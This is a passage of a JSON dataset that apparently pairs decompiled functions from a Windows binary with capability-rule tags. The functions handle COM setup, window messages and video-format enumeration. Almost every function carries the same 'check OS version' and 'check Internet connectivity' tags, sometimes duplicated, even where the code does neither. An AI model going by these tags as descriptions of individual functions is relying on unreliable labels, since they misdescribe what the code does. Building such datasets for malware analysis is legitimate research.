            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462a58(int32_t arg_8h, uint noname_1, uint noname_2, int32_t *arg_14h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    int32_t iStack24;\n    uchar *puStack20;\n    uchar *var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x462a6a;\n    fcn.00407080();\n    iStack24 = 0x462ae0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    piStack32 = arg_14h;\n    puStack20 = &stack0xfffffffc;\n    var_4h = (**(*arg_14h + 0x10))();\n    if (0 < var_4h) {\n        (**(*arg_14h + 0xc))(arg_14h, &fcn.00462a58::var_8h);\n        if (*(arg_8h + 8) == 0) {\n            puStack20 = var_8h;\n            iStack24 = var_4h;\n            piStack28 = 0x402;\n            piStack32 = *(**0x495b08 + 4);\n            sub.user32.dll_SendMessageA();\n        }\n        else {\n            puStack20 = 0x462ac8;\n            (**(arg_8h + 8))();\n        }\n    }\n    *in_FS_OFFSET = piStack32;\n    iStack24 = 0x462ae7;\n    piStack28 = 0x462adf;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 388
    },
    "00462af0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00462af0(int32_t arg_8h, uint noname_1, uint noname_2, uint arg_14h, int32_t arg_18h)\n\n{\n    if (0 < arg_18h) {\n        if (*(arg_8h + 8) == 0) {\n            sub.user32.dll_SendMessageA(*(**0x495b08 + 4), 0x402, arg_18h, arg_14h);\n        }\n        else {\n            (**(arg_8h + 8))();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 134
    },
    "00462948": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00462a06)\n// WARNING: Removing unreachable block (ram,0x00462a12)\n// WARNING: Removing unreachable block (ram,0x00462a08)\n\nvoid fcn.00462948(void)\n\n{\n    uchar *puVar1;\n    int32_t **in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x462a46;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    if (*in_EAX == NULL) {\n        puStack48 = 0x46297c;\n        piVar2 = fcn.00404620();\n        *in_EAX = piVar2;\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    uStack52 = 0x46299d;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(**in_EAX + 0x44))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x4629b6;\n    puStack48 = fcn.0040700c();\n    uStack52 = *0x4959ec;\n    uStack56 = 1;\n    uVar5 = *0x495ab8;\n    uVar3 = sub.ole32.dll_CoCreateInstance(*0x495ab8, 0);\n    if ((uVar3 & 0x80000000) == 0) {\n        fcn.0040700c();\n        uVar4 = fcn.0040700c(0);\n        (**(_pe_dos_header + 0xc))(0, *0x495c68, uVar4);\n    }\n    *in_FS_OFFSET = uVar5;\n    uStack56 = 0x462a4d;\n    fcn.00405530();\n    fcn.0040700c();\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 566
    },
    "00462c0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00462c0c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff5c;\n    uint uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint var_49h;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    \n    puStack96 = 0x462c2a;\n    var_49h._0_1_ = param_2;\n    fcn.00405fe8();\n    uStack100 = 0x462e3e;\n    uStack104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff98;\n    puStack96 = &stack0xfffffffc;\n    uVar1 = fcn.0040700c();\n    uVar2 = sub.ole32.dll_CoCreateInstance(*0x495aec, 0, 3, *0x495cac, uVar1);\n    if ((uVar2 & 0x80000000) == 0) {\n        uVar1 = fcn.0040700c();\n        uVar2 = sub.ole32.dll_CoCreateInstance(*0x495900, 0, 1, 0x462e50, uVar1);\n        if ((uVar2 & 0x80000000) == 0) {\n            uVar1 = fcn.0040700c();\n            in_stack_ffffff5c = *0x495a20;\n            uVar2 = sub.ole32.dll_CoCreateInstance(*0x495a20, 0, 1, *0x4957f4, uVar1);\n            if ((uVar2 & 0x80000000) == 0) {\n                uVar1 = fcn.0040700c();\n                uVar2 = (****(in_EAX + 0x24))(*(in_EAX + 0x24), *0x495bdc, uVar1);\n                if ((uVar2 & 0x80000000) == 0) {\n                    (**(**(in_EAX + 0x34) + 0x18))(*(in_EAX + 0x34), 0);\n                    if (var_49h != '\\0') {\n                        fcn.00403af4();\n                        unique0x00006400 = **0x495bf0;\n                        uStack72 = (*0x495bf0)[1];\n                        uStack68 = (*0x495bf0)[2];\n                        uStack64 = (*0x495bf0)[3];\n                        var_38h = **0x495b24;\n                        uStack56 = (*0x495b24)[1];\n                        uStack52 = (*0x495b24)[2];\n                        uStack48 = (*0x495b24)[3];\n                        uVar2 = (**(**(in_EAX + 0x34) + 0x10))(*(in_EAX + 0x34), &fcn.00462c0c::var_49h + 1);\n                        if ((uVar2 & 0x80000000) != 0) goto code_r0x00462e22;\n                    }\n                    if (*(in_EAX + 0x3c) == 0) {\n                        uVar1 = fcn.00404620();\n                        *(in_EAX + 0x3c) = uVar1;\n                        uVar1 = fcn.00404620();\n                        *(*(in_EAX + 0x3c) + 0xc) = uVar1;\n                        fcn.00407024();\n                    }\n                    (**(**(in_EAX + 0x34) + 0x24))(*(in_EAX + 0x34), *(in_EAX + 0x40), param_1);\n                    uVar1 = fcn.0040700c();\n                    in_stack_ffffff5c = *0x495a74;\n                    uVar2 = sub.ole32.dll_CoCreateInstance(*0x495a74, 0, 3, *0x4957e4, uVar1);\n                    if ((uVar2 & 0x80000000) == 0) {\n                        uVar1 = fcn.0040700c();\n                        uVar2 = (****(in_EAX + 0x14))(*(in_EAX + 0x14), *0x495844, uVar1);\n                        if ((uVar2 & 0x80000000) == 0) {\n                            uVar1 = fcn.0040700c();\n                            uVar2 = (****(in_EAX + 0x14))(*(in_EAX + 0x14), *0x495c34, uVar1);\n                            if ((uVar2 & 0x80000000) == 0) {\n                                uVar1 = fcn.0040700c();\n                                uVar2 = (****(in_EAX + 0x14))(*(in_EAX + 0x14), *0x4958b0, uVar1);\n                                if ((uVar2 & 0x80000000) == 0) {\n                                    (**(**(in_EAX + 0x10) + 0x34))(*(in_EAX + 0x10), *(in_EAX + 4), 0x8001, 0);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00462e22:\n    *in_FS_OFFSET = in_stack_ffffff5c;\n    fcn.004060ac(0x462e45);\n    return;\n}\n",
        "token_count": 1295
    },
    "00463050": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0046312e)\n// WARNING: Removing unreachable block (ram,0x00463132)\n// WARNING: Removing unreachable block (ram,0x00463177)\n\nvoid __cdecl fcn.00463050(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = 0x463072;\n    fcn.004059cc();\n    uStack56 = 0x4631ab;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00405530();\n    fcn.00409b84();\n    fcn.004055c8();\n    if (in_EDX == 0) {\n        fcn.004055c8();\n    }\n    if (arg_8h != 0) {\n        fcn.0040700c();\n        uStack80 = *0x495ab8;\n        uVar1 = sub.ole32.dll_CoCreateInstance();\n        if ((uVar1 & 0x80000000) == 0) {\n            fcn.0040700c();\n            fcn.0040700c();\n            (**(_pe_dos_header + 0xc))(0);\n        }\n    }\n    *in_FS_OFFSET = uStack80;\n    fcn.00405530();\n    fcn.0040700c();\n    fcn.00405530();\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 425
    },
    "004631cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004631cc(void)\n\n{\n    int32_t in_EAX;\n    uint uStack20;\n    uint uStack16;\n    \n    if (*(in_EAX + 8) != 0) {\n        sub.user32.dll_GetClientRect(*(in_EAX + 4), &uStack20);\n        (**(**(in_EAX + 8) + 0x9c))(*(in_EAX + 8), 0, 0, uStack20, uStack16);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0046324c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046324c(uint param_1, char param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar7;\n    int32_t *piStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t *piStack48;\n    uint uStack44;\n    uint uStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_5h;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        uStack28 = 0x46326f;\n        uStack28 = fcn.0040700c();\n        uStack32 = *0x4957dc;\n        piStack36 = *(in_EAX + 0x38);\n        uStack40 = 0x463281;\n        iVar3 = (***piStack36)();\n        if (iVar3 != 0) {\n            uStack28 = 0x463290;\n            fcn.0040700c();\n        }\n    }\n    if (*(in_EAX + 0x30) == 0) {\n        uStack28 = 0x4632a4;\n        uStack28 = fcn.0040700c();\n        uStack32 = *0x49587c;\n        piStack36 = *(in_EAX + 0x38);\n        uStack40 = 0x4632b6;\n        iVar3 = (***piStack36)();\n        if (iVar3 != 0) {\n            uStack28 = 0x4632c5;\n            fcn.0040700c();\n        }\n    }\n    uStack28 = 0x463428;\n    uStack32 = *(in_EAX + 0x38);\n    piStack36 = *(in_EAX + 0x14);\n    uStack40 = 0x4632dd;\n    uVar4 = (**(*piStack36 + 0xc))();\n    if ((uVar4 & 0x80000000) == 0) {\n        uStack40 = 0x463444;\n        uStack44 = *(in_EAX + 0x24);\n        piStack48 = *(in_EAX + 0x14);\n        puStack52 = 0x463303;\n        uVar4 = (**(*piStack48 + 0xc))();\n        if ((uVar4 & 0x80000000) == 0) {\n            if (param_2 == '\\0') {\n                puStack52 = 0x463464;\n                uStack56 = *(in_EAX + 0x2c);\n                piStack60 = *(in_EAX + 0x14);\n                uVar4 = (**(*piStack60 + 0xc))();\n                if ((uVar4 & 0x80000000) != 0) {\n                    return uVar4;\n                }\n            }\n            puStack52 = 0x463347;\n            puVar5 = fcn.00402f00();\n            puStack52 = 0x463353;\n            puVar6 = fcn.00402f00();\n            puVar2 = *0x495a84;\n            puVar1 = *0x495a84 + 1;\n            *puVar5 = **0x495a84;\n            puVar5[1] = *puVar1;\n            puVar5[2] = puVar2[2];\n            puVar5[3] = puVar2[3];\n            puVar2 = *0x495bf0;\n            puVar1 = *0x495bf0 + 1;\n            *puVar6 = **0x495bf0;\n            puVar6[1] = *puVar1;\n            puVar6[2] = puVar2[2];\n            puVar6[3] = puVar2[3];\n            uStack56 = 0x4633d4;\n            piStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            if (param_2 == '\\0') {\n                piVar7 = *(in_EAX + 0x18);\n                puStack52 = &stack0xfffffffc;\n                uVar4 = (**(*piVar7 + 0x1c))\n                                  (piVar7, puVar5, puVar6, *(in_EAX + 0x38), *(in_EAX + 0x24), *(in_EAX + 0x2c));\n            }\n            else {\n                piVar7 = *(in_EAX + 0x18);\n                puStack52 = &stack0xfffffffc;\n                uVar4 = (**(*piVar7 + 0x1c))(piVar7, puVar5, puVar6, *(in_EAX + 0x38), *(in_EAX + 0x24), 0);\n            }\n            *in_FS_OFFSET = piVar7;\n            if ((uVar4 & 0x80000000) == 0) {\n                if ((param_2 != '\\0') && (uVar4 = fcn.00463204(),  (uVar4 & 0x80000000) != 0)) {\n                    return uVar4;\n                }\n                uVar4 = (**(**(in_EAX + 0xc) + 0x1c))(*(in_EAX + 0xc));\n                *(in_EAX + 0x1c) = 2;\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 1260
    },
    "0046348c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046348c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uchar in_CL;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar2;\n    int32_t *piStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4634a2;\n    fcn.004059cc();\n    uStack28 = 0x463519;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.0040700c();\n    *(in_EAX + 0x44) = in_CL;\n    piVar2 = *(in_EAX + 0x18);\n    uVar1 = (**(*piVar2 + 0xc))(piVar2, *(in_EAX + 0x14));\n    if ((uVar1 & 0x80000000) == 0) {\n        uVar1 = fcn.00463050(in_EAX + 0x38);\n        if ((uVar1 & 0x80000000) == 0) {\n            fcn.0046376c();\n            if (arg_8h != '\\0') {\n                fcn.00463480();\n            }\n        }\n    }\n    *in_FS_OFFSET = piVar2;\n    piStack32 = 0x463520;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 351
    },
    "0046352c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046352c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_118h;\n    uint var_114h;\n    int32_t var_110h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    var_8h = NULL;\n    var_ch = NULL;\n    puStack296 = 0x463557;\n    fcn.00405fe8();\n    uStack300 = 0x46367a;\n    piStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    puStack296 = &stack0xfffffffc;\n    fcn.0040700c();\n    fcn.0040700c();\n    uVar1 = fcn.0040700c();\n    iVar2 = (**(*param_2 + 0x28))(param_2, uVar1);\n    while (iVar2 == 0) {\n        uVar1 = fcn.0040700c(&fcn.0046352c::var_118h);\n        iVar2 = (**(*var_4h + 0xc))(var_4h, 1, uVar1);\n        if ((iVar2 == 0) && (var_8h != NULL)) {\n            uVar1 = fcn.0040700c();\n            iVar2 = (**(*var_8h + 0x18))(var_8h, uVar1);\n            if ((iVar2 == 0) && (var_ch != NULL)) {\n                uVar1 = fcn.004060ac();\n                iVar2 = (**(*var_ch + 0x20))(var_ch, uVar1);\n                if ((iVar2 == 0) && (var_110h == 0)) {\n                    fcn.0046352c();\n                    (**(**(in_EAX + 0x14) + 0x24))(*(in_EAX + 0x14), var_ch);\n                    (**(**(in_EAX + 0x14) + 0x24))(*(in_EAX + 0x14), var_8h);\n                    (**(**(in_EAX + 0x14) + 0x10))(*(in_EAX + 0x14), var_114h);\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = param_2;\n    piStack304 = 0x463681;\n    fcn.004060ac();\n    fcn.004060f8();\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 628
    },
    "004636a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004636a0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x34) != 0) {\n        (**(**(in_EAX + 0x34) + 0x24))(*(in_EAX + 0x34), 0, 1);\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        (**(**(in_EAX + 0xc) + 0x3c))(*(in_EAX + 0xc));\n    }\n    *(in_EAX + 0x1c) = 0;\n    if (*(in_EAX + 0x10) != 0) {\n        (**(**(in_EAX + 0x10) + 0x34))(*(in_EAX + 0x10), 0, 0x8001, 0);\n    }\n    if (*(in_EAX + 8) != 0) {\n        (**(**(in_EAX + 8) + 0x4c))(*(in_EAX + 8), 0);\n        (**(**(in_EAX + 8) + 0x74))(*(in_EAX + 8), 0);\n    }\n    return;\n}\n",
        "token_count": 275
    },
    "00463700": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00463700(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*(in_EAX + 0xc) != 0) {\n        if (param_2 == '\\0') {\n            uVar1 = (**(**(in_EAX + 0xc) + 0x24))(*(in_EAX + 0xc));\n            *(in_EAX + 0x1c) = 0;\n        }\n        else if (*(in_EAX + 0x1c) != '\\x02') {\n            uVar1 = (**(**(in_EAX + 0xc) + 0x1c))(*(in_EAX + 0xc));\n            *(in_EAX + 0x1c) = 2;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 199
    },
    "0046376c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0046376c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint uStack220;\n    uint uStack216;\n    uchar *puStack212;\n    uint var_c0h;\n    uint var_a8h;\n    int32_t *var_28h;\n    int32_t var_24h;\n    uint var_1dh;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack212 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack216 = 0x463a0e;\n    uStack220 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff24;\n    fcn.00406928(0);\n    var_8h = fcn.00463734();\n    if (var_8h == 0) {\n        var_8h = (**(*var_4h + 0x14))(var_4h, &fcn.0046376c::var_18h, &fcn.0046376c::var_1dh + 1);\n    }\n    var_14h = 0;\n    if ((var_8h == 0) && (-1 < var_18h + -1)) {\n        var_24h = var_18h;\n        iVar3 = 0;\n        do {\n            var_ch = &fcn.0046376c::var_a8h;\n            var_8h = (**(*var_4h + 0x18))(var_4h, iVar3, &fcn.0046376c::var_10h, var_ch);\n            iVar2 = *(var_10h + 0x10);\n            var_28h = var_ch + 5;\n            if (((var_8h & 0x80000000) == 0) &&\n               (((cVar1 = fcn.00462840(),  cVar1 != '\\0' || (iVar2 == 0x47504a4d)) ||\n                ((((iVar2 == 0x32595559 || ((iVar2 == 0x564e5559 || (iVar2 == 0x56595559)))) &&\n                  (*var_28h * var_28h[1] * 2 == *(var_10h + 0x28))) ||\n                 ((((iVar2 == 0x30323449 || (iVar2 == 0x32315659)) || (iVar2 == 0x56555949)) &&\n                  (*var_28h * var_28h[1] * 3 >> 1 == *(var_10h + 0x28))))))))) {\n                fcn.00406928(var_14h + 1);\n                iVar2 = var_14h;\n                *(*(in_EAX + 0x50) + 0xc + var_14h * 0x18) = iVar3;\n                *(*(in_EAX + 0x50) + var_14h * 0x18) = *var_28h;\n                *(*(in_EAX + 0x50) + 4 + var_14h * 0x18) = var_28h[1];\n                *(*(in_EAX + 0x50) + 0x10 + var_14h * 0x18) = var_10h;\n                *(*(in_EAX + 0x50) + 8 + var_14h * 0x18) = *(var_10h + 0x28);\n                cVar1 = fcn.00462840();\n                if (cVar1 == '\\0') {\n                    fcn.004030fc();\n                }\n                else {\n                    *(*(in_EAX + 0x50) + 0x14 + iVar2 * 0x18) = *0x463a20;\n                }\n                var_14h = var_14h + 1;\n            }\n            iVar3 = iVar3 + 1;\n            var_24h = var_24h + -1;\n        } while (var_24h != 0);\n    }\n    if (1 < var_14h) {\n        do {\n            var_1dh._0_1_ = '\\0';\n            if (-1 < var_14h + -2) {\n                var_24h = var_14h + -1;\n                iVar3 = 0;\n                do {\n                    if ((*(*(in_EAX + 0x50) + 0x18 + iVar3 * 0x18) < *(*(in_EAX + 0x50) + iVar3 * 0x18)) ||\n                       ((*(*(in_EAX + 0x50) + iVar3 * 0x18) == *(*(in_EAX + 0x50) + 0x18 + iVar3 * 0x18) &&\n                        (*(*(in_EAX + 0x50) + 0x1c + iVar3 * 0x18) < *(*(in_EAX + 0x50) + 4 + iVar3 * 0x18))))) {\n                        var_1dh._0_1_ = '\\x01';\n                        puVar4 = *(in_EAX + 0x50) + iVar3 * 0x18;\n                        puVar5 = &fcn.0046376c::var_c0h;\n                        for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                        puVar4 = *(in_EAX + 0x50) + 0x18 + iVar3 * 0x18;\n                        puVar5 = *(in_EAX + 0x50) + iVar3 * 0x18;\n                        for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                        puVar4 = &fcn.0046376c::var_c0h;\n                        puVar5 = *(in_EAX + 0x50) + 0x18 + iVar3 * 0x18;\n                        for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                    }\n                    iVar3 = iVar3 + 1;\n                    var_24h = var_24h + -1;\n                } while (var_24h != 0);\n            }\n        } while (var_1dh != '\\0');\n    }\n    *in_FS_OFFSET = uStack220;\n    puStack212 = 0x463a15;\n    uStack216 = 0x463a0d;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 1637
    },
    "00463db8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463db8(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = (*(in_EAX + 0x2c) + 1U) % *(in_EAX + 0x30);\n    puStack28 = 0x463df1;\n    (****(*(in_EAX + 0x28) + 0x1c + uVar2 * 0x20))();\n    uStack32 = 0x463ea1;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    iVar1 = *(in_EAX + 0x28) + uVar2 * 0x20;\n    puStack28 = &stack0xfffffffc;\n    if (*param_1 != *(iVar1 + 4)) {\n        *(iVar1 + 4) = *param_1;\n        puStack28 = &stack0xfffffffc;\n        fcn.00402f34();\n    }\n    *(iVar1 + 8) = *(in_EAX + 0x18);\n    *(iVar1 + 0xc) = *(in_EAX + 0x1c);\n    if (*(in_EAX + 0xb) == '\\0') {\n        *(iVar1 + 0x10) = *(in_EAX + 0x20);\n    }\n    else {\n        *(iVar1 + 0x10) = 0;\n    }\n    *(iVar1 + 0x18) = 0;\n    fcn.004030fc();\n    *(in_EAX + 0x2c) = uVar2;\n    fcn.0042edd0();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x463ea8;\n    uStack32 = 0x463ea0;\n    (**(**(*(in_EAX + 0x28) + 0x1c + uVar2 * 0x20) + 4))();\n    return;\n}\n",
        "token_count": 525
    },
    "00463eec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463eec(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    int32_t iStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iStack32 = *param_2;\n    if (iStack32 == *(in_EAX + 0x38)) {\n        iStack28 = 0x463f66;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &iStack32;\n        if (*(in_EAX + 10) == '\\0') {\n            *(in_EAX + 10) = 1;\n            fcn.004648b4();\n            if (*(in_EAX + 0x42) != 0) {\n                (**(in_EAX + 0x40))();\n            }\n            *(in_EAX + 10) = 0;\n        }\n        *in_FS_OFFSET = iStack32;\n    }\n    else {\n        puStack24 = param_2[2];\n        iStack28 = param_2[1];\n        iVar1 = sub.user32.dll_DefWindowProcA(*(in_EAX + 0x34));\n        param_2[3] = iVar1;\n    }\n    return;\n}\n",
        "token_count": 311
    },
    "00463fa8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
